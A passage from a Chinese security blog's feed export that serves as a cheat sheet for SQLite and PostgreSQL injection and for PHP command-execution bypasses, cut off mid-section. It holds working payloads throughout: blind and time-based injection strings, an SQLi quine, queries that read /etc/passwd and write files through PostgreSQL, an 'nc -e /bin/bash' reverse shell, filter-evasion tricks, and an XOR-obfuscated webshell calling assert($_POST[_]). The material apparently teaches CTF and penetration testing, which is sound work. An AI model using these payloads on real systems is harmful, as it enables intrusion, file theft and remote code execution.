(ID,ITEM,LOG) VALUES (1, "Turkey", "Most British families liketo cook their own turkey. A large number of vegetables and fruits, such asasparagus, celery, onions and chestnuts, are stuffed into the belly of a tenpound turkey, and then coated with a variety of spices before being baked inthe oven.");INSERT INTO SECRET (id,fl4ggg) VALUES (1, "flag{Y1ng}");</code></pre><p>在<code>mysql</code>中查询库名、表名等有系统数据库<code>information_schema</code>，而在<code>sqlite</code>中则是表<code>sqlite_master</code></p><pre class="language-none"><code class="language-none">sqlite&gt; .schema sqlite_masterCREATE TABLE sqlite_master (  type text,  name text,  tbl_name text,  rootpage integer,  sql text);</code></pre><pre class="language-none"><code class="language-none">--查询表名sqlite&gt; SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%';GIFTSECRET--注：这里之所以使用NOT like 'sqlite_%'，是避免出来系统的表，但是可能题目故意将表名弄成sqlite开头--查询列名sqlite&gt; SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='GIFT';CREATE TABLE GIFT(ID INT PRIMARY KEY NOT NULL,ITEM TEXT NOT NULL,LOG TEXT NOT NULL)sqlite&gt; SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='SECRET';CREATE TABLE SECRET(ID INT NOT NULL,fl4ggg TEXT PRIMARY KEY NOT NULL)</code></pre><h2 id="字符串截取"><a href="#字符串截取" class="headerlink" title="字符串截取"></a>字符串截取</h2><p>与<code>mysql</code>类似，<code>sqlite</code>中也有字符串截取的函数</p><p><code>substr()、substring()、like、=、&gt;、&lt;、in、between</code>，这些与<code>mysql</code>差不多</p><p>而<code>sqlite</code>特有的</p><p><strong>TRIM</strong></p><pre class="language-none"><code class="language-none">TRIM (字符串,要移除的字符) 如果要移除的字符不写，默认是空格LTRIM 字符串开头部分移除RTRIM 字符串结尾部分移除--这个函数与mysql中的TRIM用法不一样sqlite&gt; select trim('aaaadsd','a');dsdsqlite&gt; select trim('aaaadsda','a');dsd可以通过特定的trim构造，实现right()和left()的功能sqlite&gt; select ltrim('casdasd','a') = ltrim("casdasd","c");0--通过ltrim去除字符与后一个trim判断相等，确定字符</code></pre><p><strong>printf(FORMAT,…)</strong></p><pre class="language-none"><code class="language-none">sqlite&gt; select printf('%.1s','aaaaa');asqlite&gt; select printf('%.2s','aaaaa');aasqlite&gt; select printf('%.3s','aaaaa');aaa--通过printf函数格式化操作对字符串截取</code></pre><p>通过<code>printf</code>判断长度</p><pre class="language-none"><code class="language-none">--如果printf('%.is', 'abc')=printf('%.i+1s', 'abc') 则说明字符串长度为isqlite&gt; select printf('%.5s','aaaaa') = printf('%.6s','aaaaa');1</code></pre><h2 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h2><p><strong>GLOB</strong></p><p>运算符是用来匹配通配符指定模式的文本值。如果搜索表达式与模式表达式匹配，GLOB 运算符将返回1。与LIKE 运算符不同的是，<strong>GLOB 是大小写敏感的</strong>，对于下面的通配符，它遵循UNIX 的语法。</p><ul><li>星号<code>*</code></li><li>问号<code>?</code></li><li>星号<code>*</code>代表零个、一个或多个数字或字符。问号<code>?</code>代表一个单一的数字或字符。这些符号可以被组合使用。</li></ul><p><strong>LIKE</strong></p><p><strong>LIKE</strong> 运算符是用来匹配通配符指定模式的文本值。如果搜索表达式与模式表达式匹配，LIKE 运算符将返回真（true），也就是 1。这里有两个通配符与 LIKE 运算符一起使用</p><ul><li>百分号<code>%</code></li><li>下划线<code>_</code></li><li>百分号（%）代表零个、一个或多个数字或字符。下划线（_）代表一个单一的数字或字符。这些符号可以被组合使用。</li></ul><h2 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h2><ul><li><code>case when X then Y else Z end</code> 这个语句和<code>mysql</code>是相同的</li><li><code>iif(X,Y,Z)</code></li></ul><p>注意:</p><ol><li><code>sqlite</code>中没有<code>if</code>语句</li><li><code>iif</code>只有<code>version&gt;=3.32</code>可用</li></ol><pre class="language-none"><code class="language-none">sqlite&gt; select case when (1=1) then 1 else 0 end;1sqlite&gt; select case when (1=2) then 1 else 0 end;0--iif函数使用的版本比较高</code></pre><h2 id="构造报错"><a href="#构造报错" class="headerlink" title="构造报错"></a>构造报错</h2><p>在<code>mysql</code>中可以使用<code>exp(999999)</code>报错，但是<code>sqlite</code>中没有</p><p>在<code>sqlite</code>中使用<code>randomblob(N)</code>：返回<code>N-byte blob</code></p><pre class="language-none"><code class="language-none">sqlite&gt; select randomblob(1);sqlite&gt; select randomblob(2);�`sqlite&gt; select randomblob(3);~��sqlite&gt; select randomblob(4);�2q�--随机返回N个字节的字符--转化为十六进制看看sqlite&gt; select hex(randomblob(4));F8896FC0--当长度过长时报错sqlite&gt; select randomblob(10000000000);Error: string or blob too big</code></pre><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p><code>sqlite</code>中并没有<code>sleep()</code>这样的延时函数，通过<code>like</code>匹配和<code>RANDOMBLOB</code>组合延时</p><pre class="language-none"><code class="language-none">-- 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([秒]00000000/2))))sqlite&gt; select 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))));0--虽然没有像sleep那样精确，但是也够用了</code></pre><h2 id="SQLi-Quine"><a href="#SQLi-Quine" class="headerlink" title="SQLi-Quine"></a>SQLi-Quine</h2><p>在做CTF时可能遇见数据库里没有东西，但是却要求输入的与数据库查询的内容相等</p><pre class="language-none"><code class="language-none">row = db.prepare(`select pw from users where id='admin' and pw='${user.pw}'`).get();if(typeof row !== "undefined"){    req.session.isAdmin = (row.pw === user.pw);}else{    req.session.isAdmin = false;}</code></pre><p>上诉的<code>sql</code>语句要求输入的密码和查询的密码相等，在注入的过程中发现数据库没有东西。因此构造<code>payload</code></p><pre class="language-none"><code class="language-none">Payload  :' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')--Generates:' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||Payload  :' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')--')--')--Generates:' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')--')--')--</code></pre><pre class="language-none"><code class="language-none">sqlite&gt; select ''Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||');' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||sqlite&gt; select '' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')--')--')--   ...&gt; ;' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')--')--')--</code></pre><p>参考题目：ASIS CTF Quals 2020 Admin Panel</p><p>生成脚本参考：<a href="https://www.shysecurity.com/post/20140705-SQLi-Quine">https://www.shysecurity.com/post/20140705-SQLi-Quine</a></p><h1 id="PostgreSQL注入"><a href="#PostgreSQL注入" class="headerlink" title="PostgreSQL注入"></a>PostgreSQL注入</h1><h2 id="注释符-2"><a href="#注释符-2" class="headerlink" title="注释符"></a>注释符</h2><pre class="language-none"><code class="language-none">/**/--两种注释符 --后面不带空格 </code></pre><p>判断是<code>plsql</code>还是<code>sqlite</code></p><pre class="language-none"><code class="language-none">--可以注释，#不可注释，则不是mysql利用exp(999999)构造报错，可判断是PostgreSQL或者测试延时盲注利用pg_sleep()postgres=# select 123 where 123 = exp(9999999);ERROR:  value out of range: overflow</code></pre><h2 id="LIKE注入"><a href="#LIKE注入" class="headerlink" title="LIKE注入"></a>LIKE注入</h2><pre class="language-none"><code class="language-none">string LIKE pattern [ESCAPE escape-character]string NOT LIKE pattern [ESCAPE escape-character]</code></pre><p>在LIKE 子句中，通常与通配符结合使用，通配符表示任意字符，在PostgreSQL 中，主要有以下两种通配符（如果没有使用通配符，LIKE 子句和等号= 一样）：</p><ul><li>百分号<code>%</code></li><li>下划线<code>_</code></li></ul><p><code>_</code>匹配任意一个字符，<code>%</code>匹配0至多个任意字符。</p><p>下面是 LIKE 语句中演示了 <strong>%</strong> 和 <strong>_</strong> 的一些差别:</p><p>表格 还在加载中，请等待加载完成后再尝试复制</p><p>在 PostgreSQL 中，LIKE 子句是只能用于对字符进行比较，因此在上面例子中，我们要将整型数据类型转化为字符串数据类型。</p><p>根据活动的语言环境，可以使用关键字<code>ILIKE</code>代替<code>LIKE</code>来使匹配不区分大小写。这不是 SQL 标准，而是 PostgreSQL 扩展。</p><p>如果匹配的字符串中包含特殊字符，使用<code>escape ''</code>来选择转义任何字符</p><pre class="language-none"><code class="language-none">postgres=# select 'aaa%bbb' like 'aaa%'; ?column?---------- t(1 row)postgres=# select 'aaa%bbb' like 'aaa1%' escape '1'; ?column?---------- f(1 row)postgres=# select 'aaa%bbb' like 'aaa1%%' escape '1'; ?column?---------- t(1 row)postgres=# select 'aaa%bbb' like 'aaa1%bb' escape '1'; ?column?---------- f(1 row)postgres=# select 'aaa%bbb' like 'aaa1%bb_' escape '1'; ?column?---------- t(1 row)--可以看到使用escape之后，将1当作转义符</code></pre><p>如果<code>like</code>被过滤，可以使用<code>~~</code></p><pre class="language-none"><code class="language-none">postgres=# select '123' ~~ '1%'; ?column?---------- t(1 row)</code></pre><p>运算符<code>~~</code>等效于<code>LIKE</code>，而<code>~~*</code>对应于<code>ILIKE</code>。还有<code>!~~</code>和<code>!~~*</code>运算符分别代表<code>NOT LIKE</code>和<code>NOT ILIKE</code>。所有这些运算符都是特定于 PostgreSQL 的。您可能会在<code>EXPLAIN</code>输出和类似的位置看到这些运算符名称，因为解析器实际上翻译了<code>LIKE</code>等。这些运算符。</p><p><strong>类似还有****SIMILAR TO</strong></p><p><code>SIMILAR TO</code>运算符根据其模式是否与给定的字符串匹配而返回 true 或 false。它类似于<code>LIKE</code>，除了它使用 SQL 标准的正则表达式定义来解释模式。 SQL 正则表达式是<code>LIKE</code>表示法和通用正则表达式表示法之间的一个奇怪的交叉。</p><p>像<code>LIKE</code>一样，<code>SIMILAR TO</code>运算符仅在其模式与整个字符串匹配时才成功；这与常见的正则表达式行为不同，在常规行为中，模式可以匹配字符串的任何部分。与<code>LIKE</code>一样，<code>SIMILAR TO</code>使用<code>_</code>和<code>%</code>作为通配符，分别表示任何单个字符和任何字符串(在 POSIX 正则表达式中，它们分别与<code>.</code>和<code>.*</code>相类似)。</p><p>除了从<code>LIKE</code>借用的这些功能之外，<code>SIMILAR TO</code>还支持从 POSIX 正则表达式借用的这些模式匹配元字符：</p><ul><li><code>|</code>表示交替(两种选择之一)。</li><li><code>*</code>表示重复上一个项目零次或多次。</li><li><code>+</code>表示重复前一个项目一次或多次。</li><li><code>?</code>表示重复上一个项目零或一次。</li><li><code>{</code> <em>m</em> <code>MARKDOWN_HASHcbb184dd8e05c9709e5dcaedaa0495cfMARKDOWN</code><em>HASH**表示前一项正好重复</em><code>m</code> *次。</li><li><code>{</code> <em>m</em> <code>,}</code>表示重复上一项 <em>m</em> 或更多次。</li><li><code>{</code> <em>m</em> <code>,</code> <em>n</em> <code>}</code>表示前一项重复至少 <em>m</em> 但不超过 <em>n</em> 次。</li><li>括号<code>()</code>可用于将项目分组为单个逻辑项目。</li><li>与 POSIX 正则表达式一样，方括号表达式<code>[...]</code>指定字符类。</li></ul><p>请注意，句点(<code>.</code>)不是<code>SIMILAR TO</code>的元字符。</p><p>与<code>LIKE</code>一样，反斜杠会禁用任何这些元字符的特殊含义；或可以使用<code>ESCAPE</code>指定其他转义字符。</p><p>Some examples:</p><pre class="language-none"><code class="language-none">'abc' SIMILAR TO 'abc'      true'abc' SIMILAR TO 'a'        false'abc' SIMILAR TO '%(b|d)%'  true'abc' SIMILAR TO '(b|c)%'   false</code></pre><h2 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h2><p><code>plsql</code>中并没有<code>group_concat()</code>这个函数，用聚合函数<code>array_agg()、string_agg()</code></p><pre class="language-none"><code class="language-none">--array_agg(expression) 把表达式变成一个数组postgres=# select array_agg(name) from company; array_agg----------- {Paul,cc}(1 row)--通常搭配array_to_string()使用postgres=# select array_to_string(array_agg(name),',') from company; array_to_string----------------- Paul,cc(1 row)</code></pre><pre class="language-none"><code class="language-none">--string_agg(expression, delimiter) 直接把一个表达式变成字符串postgres=# select string_agg(name,',')  from company; string_agg------------ Paul,cc(1 row)</code></pre><h2 id="延时函数"><a href="#延时函数" class="headerlink" title="延时函数"></a>延时函数</h2><p><code>pg_sleep(5)</code></p><p><strong>注意：</strong></p><pre class="language-none"><code class="language-none">--与mysql中的sleep()有所不同--当将pg_sleep()与布尔一起使用时会报错，因为pg_sleep返回值为空。postgres=# select '1' = pg_sleep(1);ERROR:  argument of AND must be type boolean, not type voidLINE 1: select '1' and pg_sleep(1);</code></pre><p>这里提供几种解决的办法</p><pre class="language-none"><code class="language-none">方法1：select xxx from pg_sleep(); --可以延时，并且返回xxxpostgres=# select 1 from pg_sleep(1); ?column?----------        1(1 row)--通过这个就有返回值，可以比较了postgres=# select '1'=(select '1' from pg_sleep(1)); ?column?---------- t(1 row)--可以看出plsql的数据类型比较严格，不会随意进行转换方法2：--通过类型转换，将数据转化为字符postgres=# select '1'=pg_sleep(1)::varchar; ?column?---------- f(1 row)select * from company where id = 1 and 'a'=(case when (1=1) then pg_sleep(5)::VARCHAR else 'a' end);方法3：--通过||--与mysql不一样，在plsql中，||是拼接字符串的意思postgres=# select '1'||'asss'; ?column?---------- 1asss(1 row)select * from company where id = 1 and 'a'=(case when (1=1) then pg_sleep(5)||'b' else 'a' end);</code></pre><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><p><code>pg_ls_dir()</code>：列出目录的内容。 默认限制为超级用户，但可以授予其他用户 EXECUTE 来运行该功能。</p><p><code>pg_read_file()</code>：列出目录的内容。 默认限制为超级用户，但可以授予其他用户 EXECUTE 来运行该功能。</p><pre class="language-none"><code class="language-none">postgres=# select pg_ls_dir('/'); pg_ls_dir------------ home srv etc opt root lib mnt usr media lib64 sys dev sbin boot bin run lib32 libx32 init proc snap tmp var lost+found(24 rows)postgres=# select pg_ls_dir('/');                                       pg_read_file------------------------------------------------------------------------------------------- root:x:0:0:root:/root:/bin/bash                                                          + daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                          + bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                     + sys:x:3:3:sys:/dev:/usr/sbin/nologin                                                     + sync:x:4:65534:sync:/bin:/bin/sync                                                       + games:x:5:60:games:/usr/games:/usr/sbin/nologin                                          + man:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                          + lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin                                             + mail:x:8:8:mail:/var/mail:/usr/sbin/nologin                                              + news:x:9:9:news:/var/spool/news:/usr/sbin/nologin                                        + uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin                                      + proxy:x:13:13:proxy:/bin:/usr/sbin/nologin                                               + www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin                                     + backup:x:34:34:backup:/var/backups:/usr/sbin/nologin                                     + list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin                            + irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin                                         + gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin        + nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin                               + systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin   + systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin             + systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin+ messagebus:x:103:106::/nonexistent:/usr/sbin/nologin                                     + syslog:x:104:110::/home/syslog:/usr/sbin/nologin                                         + _apt:x:105:65534::/nonexistent:/usr/sbin/nologin                                         + tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false                              + uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin                                            + tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin                                        +</code></pre><p><strong>堆叠注入时</strong></p><pre class="language-none"><code class="language-none">CREATE TABLE Y1ng(t TEXT);COPY Y1ng FROM '/etc/passwd';SELECT * FROM Y1ng limit 1 offset 0;  --通过偏移量读取某一行SELECT * FROM Y1ng limit 1 offset 1;SELECT * FROM Y1ng limit 1 offset 2;SELECT * FROM Y1ng limit 1 offset 3;SELECT * FROM Y1ng limit 1 offset 4;SELECT * FROM Y1ng limit 1 offset 5;--直接读取文件的全部内容：CREATE TABLE Y1ng(t TEXT);COPY Y1ng(t) FROM '/etc/passwd';SELECT * FROM Y1ng;</code></pre><p><strong>文件写入</strong></p><pre class="language-none"><code class="language-none">DROP TABLE Y1ng;CREATE TABLE Y1ng (t TEXT);INSERT INTO Y1ng(t) VALUES ('hello Y1ng');COPY Y1ng(t) TO '/tmp/Y1ng';</code></pre><h2 id="系统数据库"><a href="#系统数据库" class="headerlink" title="系统数据库"></a>系统数据库</h2><p>在plsql中也存在库<code>information_schema</code></p><pre class="language-none"><code class="language-none">--查表名select table_name from information_schema.tables where table_name not like 'pg%' and table_schema='public';select table_name from information_schema.tables where table_name not like 'pg%';select string_agg(tablename, ',') from pg_tables where schemaname='public';--查列名select column_name from information_schema.columns where table_name like 'company';select string_agg(column_name, ',') from information_schema.columns where table_schema='public'(老版本)pg_class.oid对应pg_attribute.attrelidpg_class.relname表名pg_attribute.attname字段名select relname from pg_class获取表名select oid from pg_class wehre relname='admin'获取表的oidselect attname from pg_attribute where attrelid='oid的值'  获取字段名</code></pre><h2 id="plsql常用命令"><a href="#plsql常用命令" class="headerlink" title="plsql常用命令"></a>plsql常用命令</h2><pre class="language-none"><code class="language-none">select CURRENT_SCHEMA()           #查看当前权限select user                       #查看用户select current_user               #查看当前用户select chr(97)                    #将ASCII码转为字符select chr(97)||chr(100)||chr(109)||chr(105)||chr(110)  #将ASCII转换为字符串SELECT session_user;SELECT usename FROM pg_user;SELECT getpgusername();select version()                  #查看PostgreSQL数据库版本SELECT current_database()         #查看当前数据库select length('admin')            #查看长度</code></pre><p><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></p><p><a href="https://ccship.cn/tag/mysql%e6%b3%a8%e5%85%a5/">Mysql注入</a> <a href="https://ccship.cn/tag/postgresql%e6%b3%a8%e5%85%a5/">PostgreSQL注入</a> <a href="https://ccship.cn/tag/sqlite%e6%b3%a8%e5%85%a5/">Sqlite注入</a></p><p>0</p><p><a href="https://ccship.cn/2021/10/21/ysoserial%e4%bd%bf%e7%94%a8%e6%96%b9%e6%b3%95/">Previous Post</a></p><h3 id="ysoserial使用方法"><a href="#ysoserial使用方法" class="headerlink" title="ysoserial使用方法"></a><a href="https://ccship.cn/2021/10/21/ysoserial%e4%bd%bf%e7%94%a8%e6%96%b9%e6%b3%95/">ysoserial使用方法</a></h3><hr><p><a href="https://ccship.cn/2021/10/21/java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8bcommons-collections1%e9%93%be/">Next Post</a></p><h3 id="Java反序列化之Commons-Collectio"><a href="#Java反序列化之Commons-Collectio" class="headerlink" title="Java反序列化之Commons-Collectio"></a><a href="https://ccship.cn/2021/10/21/java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8bcommons-collections1%e9%93%be/">Java反序列化之Commons-Collectio</a></h3>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> 基础漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行漏洞总结</title>
      <link href="/2023/08/05/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2023/08/05/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="命令执行漏洞（RCE）"><a href="#命令执行漏洞（RCE）" class="headerlink" title="命令执行漏洞（RCE）"></a>命令执行漏洞（RCE）</h1><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>php 常见的调用外部程序的函数</p><p>系统命令执行</p><ol><li>system(args)–有回显</li><li>shell_exec(args)–无回显必须输出</li><li>passthru()</li><li>popen(handle,mode)–无回显</li><li>exec(args)–回显最后一行，必须加echo输出</li><li><strong>proc_open()</strong></li><li><strong>`(反单引号)</strong></li></ol><p>在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“`”的效果与函数 shell_exec() 相同。</p><p>php代码执行</p><ol><li>assert()a</li><li>preg_replace ( $pattern ,$replacement ,  $subject [,  $limit = -1 [, &amp;$count ]] )</li></ol><p>搜索subject中匹配pattern的部分， 以replacement进行替换。当使用被弃用的 e 修饰符时, 这个函数会转义一些字符，在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串</p><ol><li>eval()</li><li>call_user_func (  $callback [, $parameter [, $… ]] )</li></ol><p>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。 传入call_user_func()的参数不能为引用传递。</p><ol><li><strong>call_user_func_array($<strong><strong>callback</strong></strong>,$param_arr)</strong></li></ol><p>把第一个参数作为<strong>回调函数<strong><strong>（</strong></strong>callback****）</strong>调用，把参数数组作（param_arr）为回调函数的的参数传入string </p><ol><li>create_function ( $args , $code )</li></ol><p>该函数的内部实现用到了<code>eval</code>。第一个参数<code>args</code>是后面定义函数的参数，第二个参数是函数的代码。</p><ol><li>array_map ( callable $callback ,  $array1 [,  $… ] )</li></ol><p>作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</p><p>示例</p><pre class="language-none"><code class="language-none">&lt;?php        $a = $_GET['chybeta'];        $b = create_function('$a',"echo $a");        $b('');?&gt;http://localhost:2500/codeexec.php?chybeta=phpinfo();&lt;?php        $array = array(0,1,2,3,4,5);        array_map($_GET['chybeta'],$array);?&gt;http://localhost:2500/codeexec.php?chybeta=phpinfo</code></pre><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><strong>（1）管道操作</strong></p><p>将一端的命令输出交给另一端的命令处理。格式：    命令1  |  命令2    </p><p>如：ps aux | grep httpd</p><p><strong>（2）重定向</strong></p><p>改变执行命令时的默认输入输出</p><p>类型操作符用途</p><p>重定向输入                      &lt;                                  从指定文件读取数据而不是从键盘读取</p><p>重定向输出                     &gt;   或&gt;&gt;                      将输出结果覆盖、追加到指定文件（&gt;覆盖、&gt;&gt;追加）</p><p>重定向标准错误输出     2&gt;或 2&gt;&gt;                 将错误信息覆盖或追加到指定文件</p><p>重定向混合输出             &amp;&gt; 或 &amp;&gt;&gt;               将标准输出和错误信息覆盖或追加到指定文件</p><p><strong>（3)逻辑分割</strong></p><p>处理多条命令之间的逻辑关系</p><p>逻辑与                      &amp;&amp;      两条命令都要执行</p><p>逻辑或                     ||           若第一条命令执行成功，则不执行第二条命令（即只要有一条命令成功就不再继续执行命令）</p><p>顺序执行               ;              执行完第一条命令后执行第二条命令</p><p>作用</p><ol><li>读取敏感文件   /etc/passwd</li><li>NC反弹shell</li></ol><p>nc -e /bin/bash 127.0.0.1 3737</p><h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><p>Bash 是GNU操作系统的 shell 或命令语言解释器</p><h2 id="WAF-绕过"><a href="#WAF-绕过" class="headerlink" title="WAF****绕过"></a><strong>WAF****绕过</strong></h2><h3 id="常见的替换"><a href="#常见的替换" class="headerlink" title="常见的替换"></a>常见的替换</h3><p>空格</p><blockquote><p>&gt;     &lt;       &lt;&gt;</p></blockquote><p>shell下特殊符号</p><p>$(base64编码内容|d -base64)</p><h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a><strong>通配符</strong></h3><p>在bash的操作环境中有一个非常有用的功能，那就是通配符，下面列出一些常用的通配符：</p><pre class="language-none"><code class="language-none">*    代表『 0 个到无穷多个』任意字符?    代表『一定有一个』任意字符[ ]    同样代表『一定有一个在括号内』的字符(非任意字符)。例如 [abcd] 代表『一定有一个字符， 可能是 a, b, c, d 这四个任何一个』[ - ]    若有减号在中括号内时，代表『在编码顺序内的所有字符』。例如 [0-9] 代表 0 到 9 之间的所有数字，因为数字的语系编码是连续的！[^ ]    若中括号内的第一个字符为指数符号 (^) ，那表示『反向选择』，例如 [^abc] 代表 一定有一个字符，只要是非 a, b, c 的其他字符就接受的意思。</code></pre><h3 id="连接符"><a href="#连接符" class="headerlink" title="连接符"></a><strong>连接符</strong></h3><p>引号连接，注意要闭合好</p><p>单引号</p><p>/‘b’i’n’/‘c’a’t’ /‘e’t’c’/‘p’a’s’s’w’d</p><p>双引号</p><p>/“b”i”n”/“w”h”i”c”h” “n”c</p><p>反斜杆</p><p>/b\i\n/w\h\i\c\h n\c</p><h3 id="正则表达式绕过"><a href="#正则表达式绕过" class="headerlink" title="正则表达式绕过"></a>正则表达式绕过</h3><h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a><strong>空格绕过</strong></h4><ul><li><code>&lt;</code> 符号 <code>cat&lt;123</code></li><li><code>\t</code> / <code>%09</code></li><li><code>${IFS}</code> 其中{}用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串</li></ul><h4 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a><strong>黑名单绕过</strong></h4><ul><li><code>a=l;b=s;$a$b</code></li><li>base64 <code>echo "bHM=" | base64 -d</code></li><li><code>/?in/?s</code> =&gt; <code>/bin/ls</code></li><li>连接符 <code>cat /etc/pass'w'd</code></li><li>未定义的初始化变量 <code>cat$x /etc/passwd</code></li></ul><h2 id="无字母-数字-RCE"><a href="#无字母-数字-RCE" class="headerlink" title="无字母(数字)RCE"></a>无字母(数字)RCE</h2><p>推荐p神的文章–<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p>利用各种非数字字母的字符，经过各种变换（异或、取反、自增），构造出单个的字母字符，然后把单个字符拼接成一个函数名，比如说<code>assert</code>，然后就可以动态执行了。所以说这里的核心就是要将非字母的字符变换成字母字符。</p><h3 id="1-异或"><a href="#1-异或" class="headerlink" title="1.异或 ^"></a>1.异或 ^</h3><p>指的是php按位异或，在php中，两个字符进行异或操作后，得到的依然是<strong>一个字符</strong>，当我们想得到<code>a-z</code>中某个字母时，就可以找到两个非字母数字的字符，只要他们俩的异或结果是这个字母即可。而在php中，两个字符进行异或时，会先将字符串转换成<code>ascii码</code>值，再将这个值转换成二进制，然后一位一位的进行按位异或，异或的规则是：<code>1^1=0,1^0=1,0^1=1,0^0=0</code>，简单的来说就是<strong>相同为零，不同为一</strong></p><p>因为很多都是不可见的字符，所以说我就先url编码了一下</p><pre class="language-none"><code class="language-none">a:'%40'^'%21' ; s:'%7B'^'%08' ; s:'%7B'^'%08' ; e:'%7B'^'%1E' ; r:'%7E'^'%0C' ; t:'%7C'^'%08'P:'%0D'^'%5D' ; O:'%0F'^'%40' ; S:'%0E'^'%5D' ; T:'%0B'^'%5F'拼接起来：$_=('%40'^'%21').('%7B'^'%08').('%7B'^'%08').('%7B'^'%1E').('%7E'^'%0C').('%7C'^'%08'); //$_=assert$__='_'.('%0D'^'%5D').('%0F'^'%40').('%0E'^'%5D').('%0B'^'%5F');  //$__=_POST$___=$$__; $___=$_POST$_($___[_]);//assert($_POST[_]);放到一排就是：$_=('%40'^'%21').('%7B'^'%08').('%7B'^'%08').('%7B'^'%1E').('%7E'^'%0C').('%7C'^'%08');$__='_'.('%0D'^'%5D').('%0F'^'%40').('%0E'^'%5D').('%0B'^'%5F');$___=$$__;$_($___[_]);</code></pre><h3 id="2-取反"><a href="#2-取反" class="headerlink" title="2.取反 ~"></a>2.取反 